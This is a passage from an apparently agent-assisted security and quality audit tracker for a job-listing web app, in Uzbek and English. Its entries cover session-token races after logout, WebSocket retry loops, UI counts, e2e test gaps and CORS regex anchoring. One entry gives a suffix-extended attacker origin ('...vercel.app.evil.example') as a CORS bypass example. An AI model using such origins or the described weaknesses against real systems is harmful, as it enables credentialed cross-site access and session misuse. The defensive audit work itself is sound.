- **Failure scenario:** A user comes back to an old tab. The inbox poll gets a 401 and the interceptor starts refreshSession. The user immediately clicks Logout. logout() bumps the generation but keeps `current` until `await logoutUser()` finishes. The refresh request's findUnique runs before logout's tokenVersion update commits, so the server issues a new access token. If that response arrives after the logout response, session.ts:73 calls setAccessToken(fresh) after logout's setAccessToken(null). React shows guest, but localStorage holds a valid 15-minute access token. requireAuth does not check tokenVersion. On reload, restore sees stored token -> /api/auth/me 200 -> 'authed' again on a shared device, up to 15 minutes after logout. The same unguarded write also lets a slow mount-restore refresh overwrite a token that login() just set.
- **Evidence:** AuthContext.tsx:157-167: `generation.current += 1; try { await logoutUser(); } ... setAccessToken(null);`. session.ts:71-74 writes the token with no generation or epoch check. auth-guard.ts:18-22 `req.user = verifyAccessToken(token)` has no version check. AuthContext.tsx:86-90 restore trusts the stored token when /me returns 200.
- **Recommended fix:** Clear the store synchronously at the start of logout (setAccessToken(null) before the await). Give the session module an epoch that login, logout and becomeGuest bump; refreshSession should record the epoch at start and drop its result, without writing current or localStorage, if the epoch changed.
- **Bajarilgan fix:** Seans davri (epoch): logout, login va mehmon holatida oshadi; davr o'zgargach tugagan refresh token yozmaydi; logout token do'konini darhol tozalaydi.
- **Test/dalil:** web typecheck/build PASS; reviewer harness (repo'da avtomatik test yo'q)

### ISSUE-132

**Header nishonlari har muvaffaqiyatsiz so'rovda 0 ga tushardi (qo'ng'iroq uchun ISSUE-067 fix'idan farqli)**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/web/src/lib/useInboxSummary.ts:20`
- **Agent sarlavhasi:** Header inbox badges still drop to 0 on any failed poll, unlike the ISSUE-067 fix for the bell
- **Failure scenario:** A user has 3 unread messages and 2 new applications. One 20s poll of /api/inbox/summary gets a 502 during a deploy, or a 401 when refresh returns undefined. authGet returns the fallback {unreadMessages:0,newApplications:0}, and setSummary overwrites the real counts. The badges and the mobile dot (Header.tsx:283) disappear until a later poll succeeds. The notification bell was changed to keep the previous count on error, but these badges in the same header were not.
- **Evidence:** useInboxSummary.ts:20 `fetchInboxSummary(token).then(setSummary).catch(() => {});`. api.ts:882-887 fetchInboxSummary uses authGet with a zero fallback. api.ts:784-787 `if (!res || !res.ok) return fallback;`. Header.tsx:37, 61-62 and 283 render those counts.
- **Recommended fix:** Add a strict variant of fetchInboxSummary that throws on error, and keep the previous summary in useInboxSummary's catch, using the same sequence guard as useNotifications.
- **Bajarilgan fix:** Header nishonlari xato bo'lgan so'rovda oldingi qiymatni saqlaydi (`fetchInboxSummaryStrict`, ketma-ketlik himoyasi).
- **Test/dalil:** web typecheck/build PASS. NOT TESTED: avtomatik test yo'q

### ISSUE-133

**WS 4401: `useNotifications` da qayta urinish chegarasi yo'q edi, `null` refresh AuthProvider'ni mehmon holatiga o'tkazmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/web/src/lib/useNotifications.ts:121`
- **Agent sarlavhasi:** WS 4401 handling: no retry cap in useNotifications, and a null refresh never moves AuthProvider to guest
- **Failure scenario:** (a) If the server keeps rejecting freshly refreshed tokens, for example during a rolling deploy where instances disagree on JWT_ACCESS_SECRET, useNotifications loops close(4401) -> POST /api/auth/refresh -> schedule(0) -> connect with zero delay. useChatSocket caps this with authFailures<2, but useNotifications has no cap. The loop burns the per-IP refresh limit (60/min), and the resulting 429s make the global interceptor's refreshes fail for normal API calls too. (b) When refreshSession returns null (session revoked on another device), both hooks just stop. The comment at useChatSocket.ts:73 says AuthProvider will switch to guest, but neither hook calls onSessionExpired, so the page stays 'authed' with dead sockets until some HTTP request happens to get a 401.
- **Evidence:** useNotifications.ts:120-124: `if (event.code === 4401) { void refreshSession().then((fresh) => { if (!disposed && fresh !== null) schedule(fresh ? 0 : undefined); }); return; }` has no failure counter. Compare useChatSocket.ts:67 `authFailures < 2`. useChatSocket.ts:73 comment `// null — seans yo'q: AuthProvider mehmon holatiga o'tadi`, but refreshSession (session.ts:69-81) never calls onSessionExpired.
- **Recommended fix:** Move the WS auth-retry logic into one shared helper used by both hooks: cap consecutive 4401 refreshes and fall back to exponential backoff. When refresh returns null, call a session-module notifier that triggers AuthProvider.becomeGuest.
- **Bajarilgan fix:** Ikkala WebSocket hook'ida 4401 refresh chegarasi (2 marta), keyin backoff; refresh `null` bo'lsa mehmon holati.
- **Test/dalil:** web typecheck/build PASS; reviewer harness

### ISSUE-134

**Kompaniya sarlavhasi foydalanuvchi o'z sharhini o'chirgandan keyin eski sharh soni va reytingni ko'rsatardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/components/companies/detail/CompanyDetailHeader.tsx:31`
- **Agent sarlavhasi:** Company header keeps the old review count and rating after the user deletes their review
- **Failure scenario:** A company has exactly 1 approved review, written by the current user (reviewSummary {count:1, rating:4}). The user deletes it. CompanyReviews calls onChange(reviews.filter(...)), so reviews=[] and the reviews tab disappears. In the header, the check `reviewTotal (1) > reviews.length (0)` is meant to detect a capped list but now passes, so it shows '4.0 · 1 review' for a company with no reviews. The same thing happens after any local delete, so the header disagrees with the reviews card, which recomputes from the local list.
- **Evidence:** CompanyDetailHeader.tsx:29-35 uses the server summary whenever `company.reviewTotal > reviews.length`. CompanyReviews.tsx:115 removes the deleted item locally. CompanyDetailView.tsx:29/81 passes the same `reviews` state to the header.
- **Recommended fix:** Decide on capping from the initial server list (company.reviews.length < reviewTotal, computed once), or adjust reviewTotal and ratingAverage when reviews are added or deleted locally. Use the server summary only when the list was actually truncated at load.
- **Bajarilgan fix:** Kompaniya sarlavhasi: ro'yxat cheklanganmi — dastlabki server ro'yxatidan aniqlanadi; cheklanmagan bo'lsa reyting jonli ro'yxatdan hisoblanadi.
- **Test/dalil:** web typecheck/build PASS. NOT TESTED: avtomatik test yo'q

### ISSUE-135

**Nomzodlar ro'yxati birinchi 50 profilda to'xtardi, qolganlarini ko'rish yo'li yo'q edi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/pages/employer/candidates/+Page.tsx:140`
- **Agent sarlavhasi:** Candidates list now stops at the first 50 profiles with no way to see more
- **Failure scenario:** The platform has 300 open-to-work candidates. An employer opens /employer/candidates without typing a search. The API now pages (pageSize 50, orderBy userId asc) and returns page/hasMore, but fetchCandidates never sends `page` and ignores `hasMore`. The employer sees the same 50 candidates, effectively the oldest accounts, plus the 'refine your search' hint. The other 250 can only be found by guessing search text. Before the audit the endpoint returned every match.
- **Evidence:** candidates.routes.ts:13-14 page/pageSize defaults and line 156 returns hasMore. lib/api.ts fetchCandidates builds only `?text=` and returns json.items. The page shows refineHint when items.length >= 50 and has no pager or 'load more'. The region filter the API supports is not exposed either.
- **Recommended fix:** Keep `hasMore` in the client result and add a 'Load more' or pager control that requests page+1 (append results; abort when the search changes). Consider ordering by resume updatedAt so page 1 is meaningful.
- **Bajarilgan fix:** Nomzodlar: API `hasMore` aniq (`pageSize + 1`), sahifada "Yana ko'rsatish" (takrorsiz qo'shiladi, keyingi sahifa xatosi alohida).
- **Test/dalil:** web typecheck/build PASS; e2e 94/94 PASS (yakuniy build): nomzodlar tekshiruvlari

### ISSUE-136

**Kompaniya sahifasidagi vakansiyalar soni 100 da to'xtardi; API qaytargan `_count` ishlatilmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/components/companies/detail/CompanyDetailView.tsx:43`
- **Agent sarlavhasi:** Company page vacancy count stops at 100; the new _count total is mapped but never used
- **Failure scenario:** A company has 140 active vacancies. /api/companies/:slug now returns only 100 (ISSUE-047) with _count.vacancies=140. The tab label `d.tabs.vacancies(company.vacancies.length)` and CompanyVacancies' count (CompanyVacancies.tsx:31) show 100, and the remaining 40 are unreachable from the company page with no hint.
- **Evidence:** lib/companies/detail.ts:149 maps activeVacancyTotal from _count.vacancies, but grep finds no consumer. CompanyDetailView.tsx:43 and CompanyVacancies.tsx:31 use vacancies.length.
- **Recommended fix:** Use company.activeVacancyTotal ?? vacancies.length for the counts. When it exceeds vacancies.length, add a 'view all' link to /vacancies?company=<slug>.
- **Bajarilgan fix:** Kompaniya sahifasi: vakansiyalar soni `_count` dan; ro'yxat cheklangan bo'lsa `/vacancies?company=<slug>` havolasi.
- **Test/dalil:** web typecheck/build PASS; brauzer P5 PASS (vakansiyalar tabi soni API `_count` bilan bir xil; demo kompaniyada ro'yxat cheklanmagan, qidiruv havolasi yo'q — cheklangan holat brauzerda sinalmadi)

### ISSUE-137

**Admin jadvallari yangi filtr yuklanayotganda oldingi filtrning qatorlarini, pager'ini va bo'sh matnini ko'rsatardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/lib/admin/useAdminResource.ts:27`
- **Agent sarlavhasi:** Admin tables show the previous filter's data, pager and empty message while the new filter loads
- **Failure scenario:** On /admin/users (page 1, 40 pages for 'all roles'), the admin switches the role to employer. While the request is pending, the old rows stay clickable and the Pager still shows pageCount=40 (users/+Page.tsx:174). If the admin clicks page 30 before the response arrives, the request becomes role=employer&page=30 and the table shows 'No users', even though employers exist. The reverse case also happens: coming from a filter with 0 results, the undimmed 'empty' message stays up for the new filter, because the empty branch does not use `pending`.
- **Evidence:** useAdminResource.ts:27 `setState(prev => prev.kind === 'ready' ? prev : {kind:'loading'})` keeps the old data. The pages render `data && data.items.length === 0` (empty text without pending styling) and `<Pager ... onChange={setPage}>` from stale data.
- **Recommended fix:** Store the key alongside the ready data. When the key differs from the current key, render the loading skeleton (or at least disable Pager and row actions). Apply `pending` to the empty branch as well.
- **Bajarilgan fix:** `useAdminResource`: filtr yoki sahifa o'zgarganda eski jadval, pager va bo'sh matn o'rniga yuklanish holati; bir xil filtrni qayta yuklashda jadval saqlanadi.
- **Test/dalil:** web typecheck/build PASS; brauzer P7 PASS (rol filtri o'zgarganda javob kelguncha skelet, eski 25 qator ko'rinmadi)

### ISSUE-138

**Bosh sahifaning har SSR'i 6 ta kategoriya soni uchun to'liq facets aggregatsiyasini bajarardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/pages/index/+data.ts:19`
- **Agent sarlavhasi:** Every home page SSR now runs the full facets aggregation just for 6 category counts
- **Failure scenario:** Every home page view (SSR, not cached) calls GET /api/vacancies/facets with no filters. That runs 7 Mongo aggregations (groupBy region, employment, experience, company and category, plus 2 counts, plus 3 lookups) with no cache header or in-process cache. At the 20k-vacancy target, the most-visited page adds the heaviest public query, only to fill six category cards. /api/stats was given a 60 s cache for exactly this reason (ISSUE-052).
- **Evidence:** index/+data.ts:19 `fetchVacancyFacets(new URLSearchParams())`. vacancies.routes.ts:113-116 has no cache. vacancies.service.ts:356-372 runs 7 parallel aggregations.
- **Recommended fix:** Add category counts to the cached homeStats (one groupBy on categoryId), or put a short in-process cache and Cache-Control on unfiltered facets.
- **Bajarilgan fix:** Filtrsiz facets 60 s jarayon ichidagi kesh, vakansiya/kompaniya/sharh yozuvida darhol bekor bo'ladi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U29]`

### ISSUE-139

**Nomzod profili hududlarni hali xatoni yashiradigan fetcher bilan yuklardi (ish beruvchi uchun ISSUE-018 da tuzatilgan holat)**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-ui-states-i18n
- **Fayl:** `apps/web/src/lib/profile/useProfileData.ts:70`
- **Agent sarlavhasi:** Seeker profile still loads regions with the fallback fetcher (the case ISSUE-018 fixed for employers)
- **Failure scenario:** GET /api/regions fails while a job seeker whose profile has a region opens /profile. fetchRegions returns [], and the core loads as 'ready'. PersonalInfo renders a select with only the placeholder option, so the region field looks unset ('Hududni tanlang'). If the user touches the select, the only choice is empty, and saving sends regionId:null, wiping their region. The employer profile was switched to fetchRegionsStrict for the same reason.
- **Evidence:** useProfileData.ts:70 `Promise.all([fetchProfile(token), fetchResume(token), fetchRegions()])`, where fetchRegions has a [] fallback. PersonalInfo.tsx:94-97 builds options from `regions`, and the save sends `regionId: form.regionId || null`. pages/profile/+Page.tsx:254 uses fetchRegionsStrict for employers.
- **Recommended fix:** Use fetchRegionsStrict in useProfileCore so the existing error state and retry are shown, or keep a disabled select showing the current region name when the list fails to load.
- **Bajarilgan fix:** Nomzod profili hududlarni `fetchRegionsStrict` bilan yuklaydi: xato bo'lsa profil xato holati va qayta urinish.
- **Test/dalil:** web typecheck/build PASS; brauzer P6 PASS (`/api/regions` 500 → profil xato holati)

### ISSUE-140

**ISSUES.md fix'ni tasdiqlamaydigan e2e tekshiruvlarini dalil sifatida ko'rsatardi (ISSUE-057, 079, 087, 092)**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `docs/audit/ISSUES.md:2001`
- **Agent sarlavhasi:** ISSUES.md cites e2e checks as evidence that do not assert the fix (ISSUE-057, 079, 087, 092)
- **Failure scenario:** ISSUE-087 (ISSUES.md:2001) cites e2e [ISSUE-025/024/059], but e2e sets isPhoneVerified=true for all users (e2e 206, 303, 1133). Deleting `if (!isAdmin) await requirePhoneVerified(req, reply)` at vacancies.routes.ts:248 leaves e2e green. ISSUE-057 (ISSUES.md:1383) cites 'e2e detail sahifa PASS', but the check titled 'ko'rishlar +1' (e2e 271-277) never reads viewsCount or updatedAt, so reverting the $inc at vacancies.service.ts:449 is undetected. ISSUE-079 (ISSUES.md:1842) cites 'e2e server SIGTERM bilan to'xtaydi', but e2e 1527-1528 only calls server.kill and sleeps with no exit assertion. On win32 (this dev platform) child.kill('SIGTERM') is a forced kill, so the graceful-shutdown path never runs. ISSUE-092 (ISSUES.md:2104) cites robots/sitemap PASS, but e2e 560-565 only checks the Sitemap line, not the absence of /dashboard or /account.
- **Evidence:** Quoted lines above. vacancies.routes.ts:248 is the only phone gate on reactivation. e2e:271-277 asserts status, slug, images and _count only.
- **Recommended fix:** Either add real assertions (e.g. an unverified employer's PATCH status→active expects 403 PHONE_NOT_VERIFIED; viewsCount +1 with updatedAt unchanged; robots excludes /dashboard; the server process exits within 10 s after SIGINT on POSIX CI) or change these Test/dalil fields to 'NOT TESTED'.
- **Bajarilgan fix:** e2e'ga haqiqiy tasdiqlar: ISSUE-087 (403 `PHONE_NOT_VERIFIED`), ISSUE-057 (ko'rishlar aynan +1, `updatedAt` o'zgarmaydi), robots.txt qoidalari.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U31]` (3 ta)

### ISSUE-141

**`CORS_PREVIEW_ORIGIN_REGEX` ruxsat yo'li testlanmagan; `env.ts` izohidagi namuna hech qachon mos kelmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/src/common/env.ts:101`
- **Agent sarlavhasi:** CORS_PREVIEW_ORIGIN_REGEX allow path and anchoring untested; env.ts example can never match
- **Failure scenario:** An operator copies the env.ts comment example `ishbor-[a-z0-9]+-myteam\.vercel\.app` (no scheme). server.ts:114 builds `^(?:REGEX)$` and tests it against the Origin header `https://ishbor-...vercel.app`, so it never matches and every preview gets 403 CORS_FORBIDDEN. `[a-z0-9]+` also misses Vercel's `git-branch` names. .env.example:36 and DEPLOY.md:71 show a different pattern (`https://ishbor-[a-z0-9-]+-...`). Separately, e2e never sets the variable (only the reject path at e2e 579-582 and 1204-1209 is covered). If the `^(?:...)$` wrapper were dropped, `https://ishbor-x-myteam.vercel.app.evil.example` would gain credentialed CORS and no test would fail. The same applies to the superRefine invalid-regex startup error.
- **Evidence:** env.ts:101 comment vs .env.example:36 vs DEPLOY.md:71. server.ts:114 `new RegExp(`^(?:${env.CORS_PREVIEW_ORIGIN_REGEX})$`, "i")`, server.ts:121. e2e-check.mjs env object (65-86) has no CORS_PREVIEW_ORIGIN_REGEX.
- **Recommended fix:** Fix the env.ts comment to the same `https://...` example. Extract the origin predicate into a testable function, or start a second short-lived server in e2e with CORS_PREVIEW_ORIGIN_REGEX set. Assert that a matching preview gets ACAO, a suffix-extended host (`...vercel.app.evil.example`) gets 403, and an invalid regex makes the process exit 1.
- **Bajarilgan fix:** `env.ts` izohidagi `CORS_PREVIEW_ORIGIN_REGEX` namunasi `https://` bilan tuzatildi. Preview origin ruxsat yo'li uchun alohida test qo'shilmadi.
- **Test/dalil:** Izoh ko'rib chiqildi; `[ISSUE-004]` faqat rad etish yo'lini tekshiradi

### ISSUE-142

**D-012 va D-016 dagi maxfiylik qoidalari amalga oshirilgan, lekin e2e tasdig'i yo'q edi**

- **Severity:** P3
- **Verdict:** PLAUSIBLE (agent topgan, mustaqil tekshirilmagan)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:44`
- **Agent sarlavhasi:** Privacy rules claimed in D-012/D-016 are implemented but have no e2e assertion
- **Failure scenario:** D-012 claims /api/candidates excludes blocked accounts and unpublished resumes, and that employers may open chats with applicants or prior contacts even when not open-to-work. D-016 claims hidden salary is nulled in similar vacancies, favorites and the seeker's applications. Removing `isBlocked: false` / `resumes: { some: published }` (candidates.routes.ts:44-46), or `withPublicSalary` in similarVacancies (vacancies.service.ts:495), favorites.routes.ts:58 or applications.routes.ts:156, breaks no e2e. The [ISSUE-007/008] check never blocks a seeker or unpublishes a resume. [ISSUE-032/033] asserts hidden salary only on list, detail and the company page. [ISSUE-039] only covers the open-to-work toggle, not the applicant or existing-conversation branches (chat.routes.ts:245-260).
- **Evidence:** e2e-check.mjs:1233-1245 (candidates), 1273-1290 (hidden salary on list/detail/company only), 1367-1377 (ISSUE-039). D-012/D-016 text in DECISIONS.md:130,174.
- **Recommended fix:** Extend the existing checks. Block seeker2 via admin and assert they vanish from /api/candidates. Set the resume to draft and assert exclusion. Favorite the hidden-salary vacancy and assert salaryMin null in /api/favorites and in /api/vacancies/:slug/similar. With isOpenToWork=false, assert the employer can still start a chat with an applicant (200).
- **Bajarilgan fix:** e2e: bloklangan va rezyumesi qoralama nomzod bazada chiqmaydi; yashirin maosh saqlanganlar va o'xshash vakansiyalarda `null`.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U33]` (2 ta)

### ISSUE-143

**Zaif denylist tasdiqlari: `[ISSUE-001]` kalit nomi o'zgarsa ham o'tardi; `[ISSUE-030]` tokenning o'zini tekshirmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/scripts/e2e-check.mjs:1145`
- **Agent sarlavhasi:** Weak denylist assertions: [ISSUE-001] passes if jobSeeker is renamed; [ISSUE-030] ignores invite-token redaction
- **Failure scenario:** [ISSUE-001] iterates `key in (item.jobSeeker ?? {})`. If the route changed to return the full user under another key (e.g. `candidate: { include: ... }`), or added a new private scalar such as googleId or isEmailVerified, the check still passes, because it tests a 5-key denylist against an allowlist fix (applications.routes.ts:250-289). [ISSUE-030] only greps `token=eyJ`. If the staff-invite path redaction at server.ts:56 regressed, the raw invite token from `/api/staff-invites/${editor.token}/accept` (e2e:914) would be logged and the check would still pass.
- **Evidence:** e2e-check.mjs:1144-1150, 1522-1524. server.ts:53-57 redactUrl handles two cases, but only one is asserted.
- **Recommended fix:** Assert that `item.jobSeeker` exists and that `Object.keys(item.jobSeeker)` equals the expected whitelist (id, email, phone, jobSeekerProfile), and likewise for jobSeekerProfile. In [ISSUE-030] also assert `!log.includes(editor.token)` (capture the token in the outer scope).
- **Bajarilgan fix:** e2e `[ISSUE-001]` aniq kalitlar ro'yxatini, `[ISSUE-030]` logda tokenning o'zi ham yo'qligini tekshiradi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build)

### ISSUE-144

**e2e hermetik emas edi: dotenv va ota muhit sozlamalari o'tib ketardi; `[ISSUE-011]` xato kodini tekshirmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/scripts/e2e-check.mjs:65`
- **Agent sarlavhasi:** e2e is not hermetic: dotenv and parent env leak unpinned settings; ISSUE-011 does not assert the error code
- **Failure scenario:** server.ts:1 imports 'dotenv/config', and e2e spawns with cwd=apps/api and `...process.env` (e2e 66, 88). Every variable not pinned in the env object therefore comes from the developer's apps/api/.env or from a `railway run` shell. Unpinned examples: TRUST_PROXY, CORS_PREVIEW_ORIGIN_REGEX, CORS_EXTRA_ORIGINS, RATE_LIMIT_MAX, SUPPORT_TELEGRAM/ADDRESS/RESPONSE_HOURS, PARTNERSHIP_EMAIL, VAPID_*, GOOGLE_CLIENT_ID. The local .env already injects VAPID_*, GOOGLE_CLIENT_ID, TELEGRAM_ADMIN_CHAT_ID and ALERTS_INTERVAL_MINUTES. With TRUST_PROXY=false inherited, the 12 login attempts in [ISSUE-011] all key to 127.0.0.1 and trip strictRateLimit (auth.routes.ts:57-58, 10/min). The check only tests `last === 429`, not `error === 'TOO_MANY_ATTEMPTS'`, so it would pass with login-guard removed. With prod CORS/SUPPORT values injected, other checks fail spuriously.
- **Evidence:** e2e-check.mjs:65-86 env object; server.ts:1; local apps/api/.env keys: DATABASE_URL REDIS_URL JWT_* PORT WEB_ORIGIN SITE_URL TELEGRAM_* GOOGLE_CLIENT_ID ADMIN_* SMTP_HOST VAPID_* MEILI_HOST ALERTS_INTERVAL_MINUTES. e2e-check.mjs:1509-1520 checks only the status.
- **Recommended fix:** Build the child env from an explicit allowlist instead of `...process.env`: PATH, SystemRoot and similar OS vars plus every env.ts key set explicitly, empty where unused. Set DOTENV_CONFIG_PATH to a nonexistent file for the child. In [ISSUE-011] assert `res.status === 429 && body.error === 'TOO_MANY_ATTEMPTS'`.
- **Bajarilgan fix:** e2e server muhiti: mavjud bo'lmagan `DOTENV_CONFIG_PATH`, testlar tayanadigan sozlamalar aniq; `[ISSUE-011]` 429 va `TOO_MANY_ATTEMPTS` kodini talab qiladi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build)

### ISSUE-145

**ISSUE-065 FIXED deb belgilangan, lekin DEPLOY.md hali e2e tarif limitini tekshiradi derdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `DEPLOY.md:170`
- **Agent sarlavhasi:** ISSUE-065 marked FIXED but DEPLOY.md still says e2e checks the tariff limit
- **Failure scenario:** An operator reads DEPLOY.md §4: the script checks '~20 ta oqimni ... tarif limiti'. Monetization is disabled (D-014, BILLING_ENABLED=false) and e2e asserts the opposite: 'faol vakansiyalar soni cheklanmagan' (e2e:585) and /api/plans 404 (e2e:153). There are also 78 checks, not ~20. ISSUES.md records ISSUE-065 as FIXED ('README, DEPLOY.md ... moslandi'), so the doc regression survives while the tracker says it is resolved.
- **Evidence:** DEPLOY.md:167-171 '...vakansiya joylash, ariza, chat, sharh, admin paneli, CORS, sitemap, OG rasm, tarif limiti.' ISSUES.md ISSUE-065 Bajarilgan fix: 'README, DEPLOY.md, `.env.example` monetizatsiya bandlari bepul modelga moslandi'.
- **Recommended fix:** Update DEPLOY.md §4 to describe the actual coverage: unlimited active vacancies, billing routes 404, security regression checks (CORS preview, JWT, uploads, WS, session revocation), and drop the count or state 78.
- **Bajarilgan fix:** DEPLOY.md e2e tavsifi amaldagi qamrovga moslandi (tarif limiti va qattiq son olib tashlandi).
- **Test/dalil:** Hujjat ko'rib chiqildi

### ISSUE-146

**ISSUE-062 dagi eskirgan dist bo'shlig'i: `test:e2e` eski build'ni sinashi mumkin edi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/package.json:17`
- **Agent sarlavhasi:** ISSUE-062 stale-dist gap remains: test:e2e can validate an old build
- **Failure scenario:** A developer edits apps/api/src (e.g. reverts a security fix) and runs `npm run test:e2e` without `npm run build`. The script only checks `existsSync(dist/server.js)` (e2e:48) and runs the previous build, so it reports 'HAMMASI O'TDI' against code that no longer matches src. ISSUE-062 is PARTIAL with no Test/dalil and no decision recording this deferral. Currently dist/server.js (05:24:26) is newer than every src .ts, so the 78/78 result is not affected today.
- **Evidence:** apps/api/package.json:17 "test:e2e": "node scripts/e2e-check.mjs". e2e-check.mjs:46-51 only checks existence. `find apps/api/src -newer apps/api/dist/server.js -name '*.ts'` currently returns nothing.
- **Recommended fix:** Make the script `npm run build && node scripts/e2e-check.mjs`, or have e2e-check.mjs compare the newest mtime under src/ with dist/server.js and abort with 'avval npm run build' when src is newer.
- **Bajarilgan fix:** e2e skripti `apps/api/src` dagi eng yangi fayl `dist/server.js` dan yangi bo'lsa "avval npm run build" bilan to'xtaydi.
- **Test/dalil:** Mantiq reviewer tomonidan tekshirildi; yakuniy e2e build'dan keyin ishga tushirildi. To'xtash holati amalda qo'zg'atilmadi

## ROUND 3 — dastlabki audit topilmalari (ISSUE-147 …)

- Round 3 brief'i (AUTH/TELEGRAM qoidalari A–L, xavfsizlik, performance, 10K) bo'yicha 18 ta faqat o'qiydigan yo'nalish, completeness critic va qo'shimcha finder'lar.
- 303 ta xom topilma root cause bo'yicha birlashtirildi (4 ta sintez agenti).
- **Adversarial verify bosqichi bajarilmadi:** rejalashtirilgan 185 ta verify agenti hisob limiti (spend limit) sababli ishga tushmadi, shuning uchun har bir muammo UNVERIFIED. Ularning to'g'riligi PHASE 3 da fix agentlari va mustaqil reviewer'lar tomonidan kod ustida tekshiriladi; yakuniy holat (FIXED / NOT REPRODUCIBLE / ...) shu tekshiruv natijasidir.
- Mavjud tracker muammosi qayta topilgan bo'lsa yangi ID berilmaydi — pastdagi "Qayta topilgan mavjud muammolar" jadvalida joriy holati bilan.
- Sarlavha, root cause, impact va fix o'zbekcha; evidence kod iqtiboslarini saqlaydi.

| Ko'rsatkich | Soni |
|---|---:|
| Xom topilmalar | 303 |
| Noyob (rad etilmagan) | 230 |
| Yangi muammolar (ID bilan) | 119 |
| Qayta topilgan mavjud muammolar | 111 |
| Rad etilgan (REFUTED) | 0 |

| Severity (yangi) | Soni |
|---|---:|
| P0 | 0 |
| P1 | 28 |
| P2 | 53 |
| P3 | 38 |

| Verification | Soni |
|---|---:|
| UNVERIFIED | 230 |

| Holat (yangi) | Soni |
|---|---:|
| FIXED | 70 |
| PARTIAL | 42 |
| WONT FIX | 7 |

### Yangi muammolar

| ID | Sev | Holat | Verification | Area | Sarlavha |
|---|---|---|---|---|---|
| [ISSUE-147](#issue-147) | P1 | FIXED | UNVERIFIED | identity/phone | Tasdiqlangan telefon unique emas: Telegram kontakt ulashish boshqa hisobdagi raqamni tekshirmay yozadi, phone indekssiz |
| [ISSUE-148](#issue-148) | P1 | FIXED | UNVERIFIED | identity/telegram | Telegram identifikatsiyasi unique bo'lmagan chat id ga bog'langan, findFirst bilan qidiriladi; Telegram hali login kanali |
| [ISSUE-149](#issue-149) | P1 | FIXED | UNVERIFIED | vacancy/moderation | Moderatsiyani chetlab o'tish: ega admin arxivlagan vakansiyani qayta faollashtiradi; admin tasdig'i kategoriya/joylashuv va blok tekshiruvisiz |
| [ISSUE-150](#issue-150) | P1 | FIXED | UNVERIFIED | scale/rate-limit | Barcha SSR API so'rovlari bitta per-IP rate-limit kvotasini (600/min) bo'lishadi: crawler yoki o'rtacha trafik 429 beradi |
| [ISSUE-151](#issue-151) | P1 | FIXED | UNVERIFIED | auth/telegram-login | Telegram hali ham login kanali: /api/auth/telegram/start va /poll sessiya beradi (A qoidasi buzilgan) |
| [ISSUE-152](#issue-152) | P1 | PARTIAL | UNVERIFIED | search/normalization | Qidiruvda matn normallashtirilmaydi: o'zbekcha apostrof variantlari, kirill-lotin va ru/en kategoriya nomlari mos kelmaydi |
| [ISSUE-153](#issue-153) | P1 | FIXED | UNVERIFIED | auth/phone-identity | Telefon va Telegram identifikatsiya modeli E/F/G qoidalariga zid: raqam unikal emas, Telegram jimgina ko'chadi, bog'lashda tasdiq yo'q |
